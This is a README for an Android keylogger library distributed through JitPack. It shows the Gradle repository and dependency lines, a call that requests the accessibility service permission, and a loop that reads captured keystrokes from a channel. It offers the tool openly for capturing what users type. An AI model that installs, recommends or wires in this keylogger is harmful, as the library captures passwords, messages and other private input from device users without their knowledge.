# Android Keylogger
### A keylogger library for Android allowing for better logging of keystrokes by ridding yourself of the unnecessary overhead of threads.
1. Add the JitPack repository to your project's build.gradle
```gradle
allprojects {
	repositories {
		...
		maven { url 'https://jitpack.io' }
	}
}
```
2. Add the dependency to your app's build.gradle
```gradle
dependencies {
        implementation 'com.github.evilthreads669966:androidkeylogger:1.0'
}
```
3. Request the accessibility service permission for your app.
```kotlin
Keylogger.requestPermission(this)
```
4. Receive on the keylogger channel
```kotlin
for(entry in Keylogger.channel){
    //do something with keystrokes
}
```